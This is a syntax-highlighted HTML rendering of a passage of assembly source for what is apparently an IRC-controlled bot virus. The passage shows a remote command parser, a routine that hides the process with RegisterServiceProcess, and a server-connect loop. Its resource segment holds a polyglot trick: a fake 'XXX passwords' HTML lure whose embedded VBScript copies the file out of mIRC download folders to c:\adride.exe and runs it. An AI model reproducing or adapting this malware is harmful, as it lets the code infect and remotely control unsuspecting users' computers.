                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">Temp</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Temp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

          </span><span class="sc5">MakePieces</span><span class="sc4">:</span><span class="sc0">           
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">IsInMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">DontSplitMore</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">MakePieces</span><span class="sc0">

          </span><span class="sc5">DontSplitMore</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Aligment</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ParseCommand</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">.elseif</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc12">'l'</span><span class="sc0">
                </span><span class="sc6">lodsd</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Aligment</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ParseCommand</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc9">.elseif</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc12">'s'</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SendMsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">.elseif</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc12">'f'</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">pushad</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">Functionlist</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc9">.elseif</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc12">'v'</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">LocalAlloc</span><span class="sc4">,</span><span class="sc5">LMEM_ZEROINIT</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; for LocalFree</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SplitStringAtSpace</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">FindReplacement</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; lstrlen</span><span class="sc0">

                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">CreateString</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lstrlen</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; created string</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; -&gt; where to copy it</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrcpy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

         </span><span class="sc5">DontChangeVariable</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LocalFree</span><span class="sc0">

        </span><span class="sc9">.else</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ParseError</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">WhereInParseData</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ParseLoop</span><span class="sc0">
        
    </span><span class="sc5">DontDoCommand</span><span class="sc4">:</span><span class="sc0">    
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">

        </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc12">'|'</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">.elseif</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc12">'l'</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc9">.elseif</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc12">'s'</span><span class="sc0"> </span><span class="sc4">||</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc12">'v'</span><span class="sc0">
                </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">lstrlenInc</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc9">.elseif</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">==</span><span class="sc12">'f'</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc9">.else</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ParseError</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ParseLoop</span><span class="sc0">


    </span><span class="sc5">ParseCommandReturn</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">ParseCommand</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


   </span><span class="sc5">ParseErrorStr</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Parse error"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">ParseError</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ParseErrorStr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ParseErrorStr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc5">FoundNoServer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">Sleep</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000</span><span class="sc4">*</span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ExitProcess</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Kernel32</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"kernel32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RegisterService</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"RegisterServiceProcess"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">HideProgram</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetModuleHandleA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Kernel32</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetProcAddress</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RegisterService</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoHide</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">NoHide</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;TempMsg db      ":Bhunji!swipnet.se ERROR :Bla bla bla",0dh,0ah</span><span class="sc0">


</span><span class="sc5">Main</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HideProgram</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetupProgram</span><span class="sc0">

</span><span class="sc1">;        mov     eax,InBuffertPtr</span><span class="sc0">
</span><span class="sc1">;        invoke  lstrcpy, eax, offset TempMsg</span><span class="sc0">

  </span><span class="sc5">RestartAllFuckingThings</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ConnectToServer</span><span class="sc0">

  </span><span class="sc5">ParseMessage</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">StrBuffert</span><span class="sc0">
        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">GetMsg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">SplitMessage</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc9">invoke</span><span class="sc0">  </span><span class="sc5">ParseCommand</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">MessageHandler</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ParseMessage</span><span class="sc0">

</span><span class="sc5">EndIrcBot</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">_rsrc</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">para</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">_rsrc</span><span class="sc0">
</span><span class="sc1">; if file is seen as HTML then the virus is dropped to c:\ and executed</span><span class="sc0">
</span><span class="sc1">; add a '&lt;!--' after MZ in the dos header to make the html more stealth</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"--&gt;'s"</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'&lt;H4&gt;XXX passwords&lt;/H4&gt;&lt;a href="http:\\www.pussysex.com"&gt;www.pussysex.com&lt;/a&gt;&lt;P&gt;Name: Jones&lt;br&gt;Pass: Jones&lt;p&gt;&lt;a href="http:\\www.teensexxx.com"&gt;'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'www.teensexxx.com&lt;/a&gt;&lt;P&gt;Name: qwerty&lt;BR&gt;Pass: qwerty&lt;p&gt;&lt;a href="http:\\www.analpleasure.com"&gt;www.analpleasure.com&lt;/a&gt;&lt;P&gt;Name: anal&lt;br&gt;Pass: anal'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'&lt;p&gt;&lt;a href="http:\\www.hornybabes.com"&gt;www.hornybabes.com&lt;/a&gt;&lt;P&gt;Name: naked&lt;br&gt;Pass: sex&lt;p&gt;&lt;a href="http:\\www.loveland.com"&gt;www.loveland.com&lt;/a&gt;'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'&lt;P&gt;Name: htroe&lt;br&gt;Pass: eerss&lt;p&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;'</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'&lt;script language = VBScript&gt;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Set fso = CreateObject("Scripting.FileSystemObject")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Set reg = CreateObject("WScript.Shell")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'if (fso.FolderExists("c:\mirc\")) Then'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FileName = "c:\mirc\download\xxxpasswords.html"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'elseif (fso.FolderExists("C:\mirc32\")) Then'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FileName = "c:\mirc32\download\xxxpasswords.html"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'elseif (fso.FolderExists("C:\programs\mirc\")) Then'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FileName = "c:\program\mirc\download\xxxpasswords.html"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'elseif (fso.FolderExists("C:\programs files\mirc\")) Then'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FileName = "c:\program files\mirc\download\xxxpasswords.html"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'elseif (fso.FolderExists("C:\programs files\mirc32\")) Then'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FileName = "c:\program files\mirc32\download\xxxpasswords.html"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'else'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'FileName = "c:\autoexec.bat"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'end if'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'fso.CopyFile FileName, "c:\adride.exe"'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'reg.Run ("c:\adride.exe")'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'&lt;/script&gt;'</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">



</span><span class="sc5">_rsrc</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">Main</span><span class="sc0"> 



















</span></div></body>
</html>
